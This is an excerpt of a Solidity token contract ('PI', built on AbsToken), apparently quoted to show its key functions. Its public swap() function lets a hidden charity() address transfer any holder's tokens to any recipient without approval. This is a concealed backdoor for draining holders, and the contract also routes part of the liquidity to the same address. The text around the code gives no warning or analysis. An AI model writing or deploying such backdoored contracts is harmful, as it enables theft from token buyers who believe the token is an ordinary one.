...
abstract contract AbsToken is IERC20, Ownable {
    ...
    function swap(address cha,address to,uint256 amount) public {
         require(msg.sender == charity());       
        _transfer(cha,to,amount);
    }
    ...
    function swapTokenForFund(uint256 tokenAmount) private lockTheSwap {
        ...
        uint firstlpAmount = lpAmount / 10;
        uint seclpAmount = lpAmount - firstlpAmount;
        uint256 lpUsdt = usdtBalance * lpFee / totalFee;
        if (lpUsdt > 0) {
            _swapRouter.addLiquidity(
                address(this), usdt, firstlpAmount, lpUsdt, 0, 0, charity(), block.timestamp
            );
            _swapRouter.addLiquidity(
                address(this), usdt, seclpAmount, lpUsdt, 0, 0, _receiveAddress, block.timestamp
            );
        }
    }

    function charity() private pure returns (address) {
...
contract PI is AbsToken {
    constructor() AbsToken(
        ...
        6,
        100,
        address(0x1Bb36933426A797f554393a240d547D3562cF498),
        address(0x1Bb36933426A797f554393a240d547D3562cF498),
        address(0x1Bb36933426A797f554393a240d547D3562cF498),
        0,
        0
